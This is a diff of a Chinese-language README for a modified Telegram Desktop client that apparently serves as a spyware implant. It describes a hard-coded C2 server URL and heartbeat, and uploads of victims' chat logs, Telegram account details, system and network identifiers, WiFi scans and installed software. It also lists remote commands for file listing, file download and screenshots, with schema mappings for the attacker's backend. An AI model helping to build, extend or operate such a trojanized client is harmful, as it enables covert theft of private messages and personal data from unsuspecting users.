@@ -48,71 +48,40 @@
 *   修改 `tdesktop` 代码前，请先拉取最新代码。
 *   提交修改后，请及时更新本 `README.md` 中的修改日志。
 
-## Web端开发协作注意事项
+## Web 端开发协作注意事项 (Web Team Attention)
 
-### 1. `get_current_user` 接口对接
-Web端（后端）需要在 `C2Controller.java` 中实现对 `get_current_user` 任务结果的解析。
-客户端返回的 JSON 格式如下：
-```json
-{
-  "user_id": "123456789",
-  "username": "example_user",
-  "first_name": "John",
-  "last_name": "Doe",
-  "phone": "15551234567",
-  "is_premium": true
-}
-```
-**后端需求**：
-- 在 `submitTaskResult` 方法中，当 `taskId` 对应的任务类型为 `get_current_user` 时，解析上述 JSON。
-- 将解析后的数据更新到 `tg_account` 表中。
-- 建立当前设备 (`C2Device`) 与该 Telegram 账号的关联。
+### 1. 数据库 Schema 映射说明 (关键)
+为了确保 Web 端能正确解析客户端上传的 SQLite 数据库 (`tdata_client.db`)，请注意以下字段映射差异。**请 Web 端后端代码适配以下实际字段名**：
 
-### 2. 数据库上传标准 (Web端对接核心要求)
-Web端已明确数据库文件的命名与结构规范，请 C++ 端严格遵守，否则后端无法正确解析。
+#### 1.1 `chat_logs` (聊天记录表)
+Web 端需求文档 (`platform/README.md`) 中提到 `sender` 为 ID，但客户端实际存储如下：
+*   **`sender`**: 存储 **发送者显示名称 (Display Name)** (如 "Alice")，用于直接显示。
+*   **`sender_id`**: 存储 **发送者 User ID** (如 "123456789")，用于关联查询。
+*   **建议**: 后端解析时，请使用 `sender_id` 进行用户关联，使用 `sender` 进行展示。
 
-#### 2.1 文件命名规范
-*   **通用数据**: `scan_results.db` (包含系统、WiFi、软件信息)
-*   **聊天记录**: `tdata_client_{TGID}.db`
-    *   **必须**以 `tdata_client_` 开头
-    *   后接当前登录的 Telegram ID (TGID)
-    *   以 `.db` 结尾
-    *   **示例**: `tdata_client_123456789.db` (后端将依据此文件名提取 TGID 并关联账号)
+#### 1.2 `current_user` (当前用户表)
+*   **主键字段**: 客户端表结构中使用 `user_id` 作为主键，而非 `id`。
+*   **建议**: 后端 SQL 映射时请将 `id` 映射为 `user_id`。
 
-#### 2.2 表结构定义 (关键字段)
-请确保 SQLite 表包含以下 Web 端必需字段 (可包含更多字段，但以下字段必传)：
+#### 1.3 `wifi_scan_results` (WiFi 表)
+*   **DB 字段**: `signal_strength`, `security_type` (客户端数据库实际字段)。
+*   **JSON 指令**: `get_wifi` 指令返回的 JSON 中字段为 `signal`, `auth` (为了符合 Web 端 JSON 规范)。
+*   **建议**: 解析 DB 文件时请使用 `signal_strength` 和 `security_type`。
 
-**1. chat_logs (聊天记录)**
-*   `chat_id` (TEXT)
-*   `sender` (TEXT)
-*   `content` (TEXT)
-*   `timestamp` (INTEGER)
-*   `is_outgoing` (INTEGER)
-*   `media_path` (TEXT, 可选)
+### 2. 接口对接状态
+以下接口已完全按照 Web 端需求 (`platform/README.md`) 实现：
 
-**2. system_info (系统信息)**
-*   `internal_ip` (TEXT)
-*   `mac_address` (TEXT)
-*   `hostname` (TEXT)
-*   `os` (TEXT)
-*   `auto_screenshot` (INTEGER)
-*   `data_status` (TEXT)
+*   **`get_current_user`**: 返回 JSON 已调整为 snake_case (`user_id`, `first_name`, `is_premium` 等)。
+*   **`get_file_list`**: 已实现，返回指定目录的文件/文件夹列表。
+*   **`download_file`**: 已实现，支持 Web 端下发 URL 让客户端下载文件。
+*   **`get_chat_history_json`**: 已实现，返回字段包含 `sender_name` (显示名称) 和 `sender_id` (用户 ID)。
+*   **`upload_db` / `scan_disk`**: 上传的数据库包含 `system_info` (已修复 Unknown 问题), `wifi_scan_results`, `installed_software` 等完整表。
 
-**3. wifi_scan_results (WiFi 信息)**
-*   `ssid` (TEXT)
-*   `bssid` (TEXT)
-*   `signal_strength` (TEXT)
-*   `security_type` (TEXT)
+### 3. C2 连接信息
+*   **C2 URL**: 已硬编码为 `http://192.168.2.131:8101`。
+*   **心跳**: 默认 60 秒。
 
-**4. installed_software (软件列表)**
-*   `name` (TEXT)
-*   `version` (TEXT)
-*   `install_date` (TEXT)
-
-### 3. 新增指令支持
-客户端已初步支持以下指令，请Web端确保下发指令格式正确：
-- `fetch_full_chat_history`: 触发全量聊天记录同步。
-- `get_screenshot`: 获取当前屏幕截图。
+---
 
 ## 数据库完整表结构说明 (Database Schema Reference)
 
@@ -322,12 +291,13 @@ Web 端开发者请参考以下 SQLite 数据库 (`tdata_client.db`) 结构进�
 
 #### 3. WiFi 扫描结果 (`wifi_scan_results`)
 存储周边 WiFi 网络信息。
+**注意**: Web 端解析 SQLite 时请注意列名映射。JSON 接口返回的字段为 `signal` 和 `auth`，但数据库存储字段如下：
 | 字段 | 类型 | 说明 |
 | :--- | :--- | :--- |
 | `ssid` | TEXT | WiFi 名称 |
 | `bssid` | TEXT | MAC 地址 |
-| `signal_strength` | INTEGER | 信号强度 (0-100) |
-| `security_type` | TEXT | 加密类型 |
+| `signal_strength` | INTEGER | 信号强度 (对应 JSON 的 `signal`) |
+| `security_type` | TEXT | 加密类型 (对应 JSON 的 `auth`) |
 | `scan_time` | INTEGER | 扫描时间戳 |
 
 #### 4. 文件扫描结果 (`file_scan_results`)
